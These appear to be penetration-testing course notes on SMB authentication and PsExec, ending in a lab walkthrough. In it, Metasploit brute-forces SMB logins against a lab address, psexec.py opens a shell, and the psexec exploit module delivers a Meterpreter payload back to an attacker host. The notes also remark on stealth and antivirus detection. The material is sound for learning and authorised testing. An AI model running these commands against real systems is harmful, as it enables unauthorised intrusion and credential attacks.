SMB
- SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (printers and serial ports) between computers on a local network (LAN).
- SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
- SAMBA is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

SMB Authentication
- The SMB protocol utilizes two levels of authentication, namely:
	- User Authentication
	- Share Authentication
- User Authentication - Users must provide a username and password in order to authenticate with the SMB server in order to access a share.
- Share Authentication - Users must provide a password in order to access a restricted share.
- Both of these authentication types utilize a challenge response authentication system.
![[Pasted image 20241029180021.png]]
- Its not required for somebody undergoing the authentication process to try to access a share, valid user credentials for a known Windows host can be used to authenticate your identity to the SMB server.
	- Step 1 - A client trying to authenticate to an SMB server would essentially send an authentication request with the local username of its user.
	- Step 2 - The server will return a response telling the client to encrypt a random string with the user's hash.
	- Step 3 - The client will then encrypt the string with the user's hash and will then send a response with the encrypted string back to the server.
	- Step 4 - The server will then verify if the encrypted string value that they have, which is obtained from the user's hash on the system, matches the encrypted value sent in the client's response.
	- If the values do match, access is granted to the client, and if they don't, the authentication request is denied.

PsExec
- PsExec is a lightweight telnet-replacement, developed by Microsoft, that allows the user to execute processes on remote windows systems, using any of the given system's user credentials.
- PsExec authentication is performed via SMB.
- We can use the PsExec utility to authenticate with the target system legitimately, and run arbitrary commands on the target system, or launch a remote command prompt.
- It is very similar to RDP, however instead of controlling the remote system via GUI, commands are sent via CMD.

SMB Exploitation With PsExec
- In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes.
- This can be done by leveraging various tools and techniques, however, the most common technique will involve performing an SMB login brute-force attack.
- We can narrow down our brute-force attack to only include common Windows user accounts like:
	- Administrator
- After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.

Practical Demonstration
- `sudo nmap -sV -sC 10.2.24.221`
- The results from the script scan inform us that the SMB version deployed on the target system is SMB v2, and message signing is enabled but not required.
- What this essentially means is that we can authenticate with this system via PsExec.
- Now we will perform a brute-force attack using Metasploit in order to obtain valid user credentials, which will help us log onto the SMB service via PsExec.
	- `service postgresql start && msfconsole`
	- `search smb_login`
	- `use auxiliary/scanner/smb/smb_login`
	- `options`
	- `set RHOSTS 10.2.24.221`
	- `set RPORT 445`
	- In the case that the target system is part of a domain, we can specify it using the `SMBDomain` option.
	- We can use the `SMBUser` and `SMBPass` options if we already have a set of credentials and want to verify if they are valid.
	- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
	- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
	- `set VERBOSE false`
	- `run`
- Using the credentials we have gained from the brute-force attack, we can now try to authenticate using PsExec.
	- The PsExec binary is a windows executable file, so it is not natively executable on Linux, as such we are using a python implementation of PsExec, known by the name of `psexec.py`.
	-  `psexec.py Administrator@10.2.24.221 cmd.exe`
	- We should now have a CMD session on our terminal, and be able to execute Command Prompt commands.
		- `whoami`
- Using PsExec to authenticate to a system and start a CMD session is a very effective penetration testing technique, since we are essentially just using valid credentials to log on to the system, and not performing any form of exploitation, of any inherent vulnerabilities, to gain access to the target system. It is a stealthier method than using Metasploit's inbuilt exploit module for authenticated code execution using PsExec, `exploit/windows/smb/psexec`.
- We can also use the `psexec` Metasploit module, `exploit/windows/smb/psexec`, to authenticate using PsExec, in this scenario, the Metasploit exploit module would first connect to the target system, upload a Meterpreter payload, and execute it to provide us with a Meterpreter session.
- While using the Metasploit exploit module, we have to be cognizant of the fact that the module uploads a malicious payload on the target system, and that as such, any antivirus solution running on the target system could detect it and flag the uploaded payload as a malicious file.
	- `service postgresql start && msfconsole`
	- `search psexec`
	- `use exploit/windows/smb/psexec`
	- `options`
	- `set RHOSTS 10.2.24.221`
	- `set RPORT 445`
	- `set SMBUser Administrator`
	- `set SMBPass qwertyuiop`
	- `set LHOST 10.10.5.2`
	- `exploit`
	- Meterpreter Session
		- `sysinfo`
		- `whoami`
		- `getuid`